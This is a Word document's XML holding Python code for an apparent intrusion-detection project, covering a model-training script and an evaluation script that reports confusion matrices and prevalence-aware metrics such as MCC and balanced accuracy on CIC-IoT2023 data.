    <w:p w14:paraId="66BD8A13" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1066D8A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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5491C7F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 = argparse.ArgumentParser(prog="mantis-train",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B15E5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description="train mantis from a dataset")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7E1DD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p.add_argument("--knn-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034C2F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p.add_argument("--payload-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB4080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p.add_argument("--kmeans-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A536D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p.add_argument("--cic-iot2023", help="CIC-IoT2023 flow csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3579F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p.add_argument("--json", dest="json_path",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709605B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help="combined json file with knn/payload/kmeans keys")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46658A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p.add_argument("--out", default="data/mantis_brain.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4088E92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p.add_argument("--max-knn-samples", type=int, default=5000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F654B3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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C046DB4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60F1669C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27FA4EC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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AE106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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B7F18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brain = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BA4F3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used = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7CE1A5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AE93E6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args.json_path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610C9A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data = loader.load_json(args.json_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7D4A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"knn" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AA2DB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brain["knn"] = train_knn(data["knn"], args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA8067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"payload" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680CE64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brain["payload"] = train_naive_bayes(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EB5D4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[(r["payload"], r["label"]) for r in data["payload"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D674A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"kmeans" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA425E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brain["kmeans"] = train_kmeans(data["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4E82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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FBFC29" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E0592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args.cic_iot2023:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BEF36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cic = loader.load_cic_iot2023(args.cic_iot2023)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768D65E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brain["knn"] = train_knn(cic["knn"], args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298A34F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brain["kmeans"] = train_kmeans(cic["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361DD10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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E9AED9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FE58D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args.knn_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747168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brain["knn"] = train_knn(loader.load_knn_csv(args.knn_csv),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC58E6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args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF56F9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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C5FF92" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EEA3B1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args.payload_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEA8E6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brain["payload"] = train_naive_bayes(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436672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loader.load_payload_csv(args.payload_csv))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3A7AF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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8CFF0B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E213F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args.kmeans_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C920BD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brain["kmeans"] = train_kmeans(loader.load_kmeans_csv(args.kmeans_csv))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DC9A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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2AD189" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48B5376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used == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1A70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no dataset given. try --help")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705837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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034C85DE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29B8539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brain["_meta"] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6C90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"trained_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E496B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"engines": sorted(k for k in brain if not k.startswith("_")),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3675FDE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79AA5E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write_brain(args.out, brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DBEC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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A178847" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33D3DA8B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6173DC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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E53B4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sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591EE9C1"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src/evaluation/evaluate.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FA7359" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>506 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5027D5D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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2342FE3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runs each engine over a labelled dataset and prints TP/FP/precision/recall/f1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1F091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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAC05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csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B516E6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glob</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E05CB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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F57E6C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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3E71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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788AE3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random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033895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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCB223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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EB867A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7192A4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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B1327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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EA74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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7D4D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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18095377" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38D3AD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from engines import bloom as bloom_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA3E8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from engines import kmeans as kmeans_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2CA8D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from engines import knn as knn_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E551B0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from engines import naive_bayes as nb_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FB228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from engines import z_score as zscore_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6965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from training import loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6874FB83" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AE1CDF1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73A6925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confusion(y_true, y_pred, positive):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5848A36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tp = fp = fn = tn = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B1FFE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t, p in zip(y_true, y_pred):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B4594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t == positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D1D08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tp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1139E6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elif t != positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753EF3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fp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B02231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elif t == positive and p != positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C08E4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fn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C379B9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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5935E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tn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357548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{"tp": tp, "fp": fp, "fn": fn, "tn": tn}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6E9DE6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01AC609E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D033B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scores(cm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10192B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"""Derive metrics from a confusion matrix, including prevalence-aware ones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B3D330" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DB9AA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Precision, recall, F1 and accuracy are all sensitive to class balance, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CE2CE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on a corpus dominated by one class they flatter a detector that has learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9DED2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nothing. CIC-IoT2023 is 97.6% attack, so a classifier that simply answers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9F59A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"attack" every time scores F1 = 0.9879 there while having no skill at all.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3EC11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Reporting only F1 against such a corpus therefore cannot distinguish a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718196D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working engine from a constant function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1385BFDB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D1DFC1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Three additions make the numbers interpretable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525DD048" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="740C3BA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specificity        - recall on the negative class, which a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1458C21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majority-positive guesser scores 0.0 on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1BD3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balanced_accuracy  - mean of recall and specificity, so both classes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429E6C4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count equally regardless of prevalence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AC2A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mcc                - Matthews correlation coefficient, which uses all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E8048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four cells and is 0.0 for any constant classifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D02DBE7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61BB08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`no_skill_f1` records what the majority-positive baseline would score on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F412F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the same data, so every reported F1 can be read against the number it has</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BB98A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to beat to mean anything.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DD220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B703A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tp, fp, fn, tn = cm["tp"], cm["fp"], cm["fn"], cm["tn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B83B17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total = tp + fp + fn + tn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563B94B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 = tp / (tp + fp) if (tp + fp) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C622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rc = tp / (tp + fn) if (tp + fn) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2859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sp = tn / (tn + fp) if (tn + fp) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390930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f1 = (2 * pr * rc / (pr + rc)) if (pr + rc) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309035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acc = (tp + tn) / total if total else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276321B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bal = (rc + sp) / 2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21103102" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0534EBE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denom = math.sqrt(float(tp + fp) * (tp + fn) * (tn + fp) * (tn + fn))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4BA08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mcc = ((tp * tn - fp * fn) / denom) if denom else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225AA5E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A9A50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majority-positive baseline on this same data: predict positive always</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D18AF7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pos = tp + fn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170F45C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prevalence = (pos / total) if total else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF511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ns_f1 = (2 * prevalence / (prevalence + 1.0)) if prevalence else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B30125" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="693FBB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{"precision": round(pr, 4), "recall": round(rc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFEE1F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"specificity": round(sp, 4), "f1": round(f1, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69305DA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"accuracy": round(acc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F86D3F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"balanced_accuracy": round(bal, 4), "mcc": round(mcc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727DCEC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"prevalence": round(prevalence, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7320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"no_skill_f1": round(ns_f1, 4)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB3D2B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33A7204E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D8F0CC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load_brain(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EB04B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"""Resolve the brain to evaluate against.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A20BE11" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="652866F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Passing nothing evaluates the seeded engines, which is the reproducible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A040FC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default: silently picking up whichever brain file happened to be newest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DE99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made the same command produce different metrics on different days, and made</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD7A1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published figures impossible to re-derive. Use `--brain auto` for the old</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2031BC3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behaviour, or name a file explicitly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0F61FA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C2E8A4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Note that a brain must be evaluated on data drawn from the same feature</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207C03E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distribution it was trained on. A CIC-IoT2023 brain scored against the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50ADEE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small hand-built sample CSVs reports meaningless numbers, because the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA5CEA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occupy different regions of the feature space.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F582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FADC3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path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48403E2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no --brain given: evaluating seeded engines "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639DD0B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"(reproducible default)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385CAE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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56ABFD9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path == "auto":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2D60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candidates = sorted(glob.glob("data/mantis_brain_*.json"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEA605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candidates:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7EEA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no brain files found in data/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEADB3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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE904E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path = candidates[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656EF5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using latest brain:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCE18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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3991CC1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brain not found:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2950798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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F53400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open(path, "r", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CD374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evaluating against brain:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CE38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json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10517F9E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21998DFE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AE908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def evaluate_knn(rows, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FB4EF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 = knn_engine.KNNMonitor(k=brain.get("knn", {}).get("k", 3))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C121A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"knn" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D89AB7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eng.import_brain(brain["knn"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6583B39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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088EA7D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ports, pkts, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CA9F9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 _ = eng.classify(ports, pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F59BA5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yt.append(label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604FD0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yp.append(verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F0B1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cm = confusion(yt, yp, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE3913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{"engine": "KNN (Port Scan)", "samples": len(rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214704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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C960F42" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
